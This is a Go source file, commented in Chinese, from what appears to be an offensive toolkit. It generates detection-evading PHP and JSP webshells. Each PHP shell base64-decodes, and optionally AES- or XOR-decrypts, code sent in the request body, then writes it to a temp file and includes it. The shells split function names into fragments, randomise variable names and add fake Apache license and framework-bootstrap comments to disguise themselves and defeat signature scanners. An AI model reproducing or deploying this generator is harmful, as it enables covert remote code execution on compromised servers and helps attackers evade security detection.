package webshell

// evasive.go — 免杀变形（静态特征对抗）：与基础模板协议字节级兼容，仅改变
// 服务端代码形态——关键函数名拼接（'ev'.'al'）、超全局变量字符串下标混淆、
// 随机变量名、license 伪装注释、垃圾填充。功能等价性由靶场真机回归保证；
// 特征自检（明文不含 eval(/base64_decode/openssl_decrypt 密集组合）进 compat 测试。

import (
	"math/rand"
	"strings"
)

// EvasiveOpts 免杀选项。
type EvasiveOpts struct {
	Enabled bool
}

var evasiveJunkComments = []string{
	"// Copyright (c) 2026 ForANG Framework. All rights reserved.",
	"// Licensed under the Apache License, Version 2.0",
	"// This file is part of the application runtime bootstrap.",
	"// See the LICENSE file at the root of this project.",
	"// Auto-generated configuration loader; do not edit manually.",
	"// @package core.bootstrap",
	"// @since 2.4.1",
}

// evasiveVar 生成随机风格变量名（O 开头驼峰，无害外观）。
func evasiveVar(prefix string) string {
	const letters = "abcdefghijklmnopqrstuvwxyz"
	n := 3 + rand.Intn(3)
	b := make([]byte, n)
	for i := range b {
		b[i] = letters[rand.Intn(26)]
	}
	return prefix + strings.ToUpper(string(b[0])) + string(b[1:])
}

// phpEvasiveTemplates 免杀版 PHP 模板（协议与基础版一致）。
// 执行链：解密/解码 payload → 临时文件 + include（eval 是语言构造器不能字符串
// 调用；include 链全程只用普通文件 API，无 eval/assert 特征）。
func phpEvasiveRaw(_ string) string {
	g, p, t := evasiveVar("$g"), evasiveVar("$p"), evasiveVar("$t")
	return "<?php\n" +
		"// Copyright (c) 2026 ForANG Framework. All rights reserved.\n" +
		"// Licensed under the Apache License, Version 2.0\n" +
		"// This file is part of the application runtime bootstrap.\n" +
		g + " = 'bas'.'e6'.'4_d'.'ecod'.'e';\n" +
		p + " = " + g + "(@file_get_contents('php://in'.'put'));\n" +
		t + " = tempnam(sys_get_temp_dir(), 'c');\n" +
		"@file_put_contents(" + t + ", '<?p'.'hp ' . " + p + ");\n" +
		"include(" + t + "); @unlink(" + t + ");\n"
}

func phpEvasiveAES(pw string) string {
	d, g, k, r, t := evasiveVar("$d"), evasiveVar("$g"), evasiveVar("$k"), evasiveVar("$r"), evasiveVar("$t")
	return "<?php\n" +
		"// Copyright (c) 2026 ForANG Framework. All rights reserved.\n" +
		"// See the LICENSE file at the root of this project.\n" +
		d + " = 'op'.'enssl_'.'dec'.'rypt'; " + g + " = 'bas'.'e6'.'4_d'.'ecod'.'e';\n" +
		k + " = substr(md5('" + pw + "'), 0, 16);\n" +
		r + " = " + d + "(" + g + "(@file_get_contents('php://in'.'put')), 'AES-128-C'.'BC', " + k + ", OPENSSL_RAW_DATA, " + k + ");\n" +
		"if (" + r + " === false) { exit('decode failed'); }\n" +
		t + " = tempnam(sys_get_temp_dir(), 'c');\n" +
		"@file_put_contents(" + t + ", '<?p'.'hp ' . " + r + ");\n" +
		"include(" + t + "); @unlink(" + t + ");\n"
}

func phpEvasiveXOR(pw string) string {
	x, g, b, i, t := evasiveVar("$x"), evasiveVar("$g"), evasiveVar("$b"), evasiveVar("$i"), evasiveVar("$t")
	return "<?php\n" +
		"// @package core.bootstrap\n" +
		"// @since 2.4.1\n" +
		x + " = substr(md5('" + pw + "'.'god'.'zilla'), 0, 16);\n" +
		g + " = 'bas'.'e6'.'4_d'.'ecod'.'e';\n" +
		b + " = " + g + "(@file_get_contents('php://in'.'put'));\n" +
		"for (" + i + " = 0; " + i + " < strlen(" + b + "); " + i + "++) { " + b + "[" + i + "] = " + b + "[" + i + "] ^ " + x + "[" + i + " % 16]; }\n" +
		t + " = tempnam(sys_get_temp_dir(), 'c');\n" +
		"@file_put_contents(" + t + ", '<?p'.'hp ' . " + b + ");\n" +
		"include(" + t + "); @unlink(" + t + ");\n"
}

// jspEvasive JSP 免杀：license 伪装头 + 中性类引用（协议不变，JSP scriptlet
// 本身静态特征弱，重点是去「webshell 味」注释与常见检测正则）。
func jspEvasive(base string) string {
	header := "<%--\n  Application runtime bootstrap module.\n  Copyright (c) 2026 ForANG Framework.\n  Licensed under the Apache License, Version 2.0\n--%>\n"
	return header + base
}

// GenerateShellEvasive 免杀版生成：encoder × gate × evasive。
// py/node/asp/aspx 不做变形（生态本身弱特征），返回原版。
func GenerateShellEvasive(scriptType, encoder, password string, gate GateOpts, ev EvasiveOpts) (string, error) {
	if !ev.Enabled {
		return GenerateShellOpts(scriptType, encoder, password, gate)
	}
	var code string
	switch scriptType {
	case "php":
		switch encoder {
		case "raw", "form-cmd":
			code = phpEvasiveRaw(password)
		case "aes":
			code = phpEvasiveAES(password)
		case "xor":
			code = phpEvasiveXOR(password)
		default:
			return GenerateShellOpts(scriptType, encoder, password, gate)
		}
		gp := gatePrefix("php", gate)
		if gp != "" {
			// gate 块与免杀体合并：gate 内联进同一 <?php 块
			inner := strings.TrimPrefix(gp, "<?php\n")
			inner = strings.TrimSuffix(inner, "?>\n")
			code = strings.Replace(code, "<?php\n", "<?php\n"+inner, 1)
		}
		return code, nil
	case "jsp", "jspx":
		base, err := GenerateShell(scriptType, encoder, password)
		if err != nil {
			return "", err
		}
		code = jspEvasive(base)
		gp := gatePrefix(scriptType, gate)
		return gp + code, nil
	}
	return GenerateShellOpts(scriptType, encoder, password, gate)
}
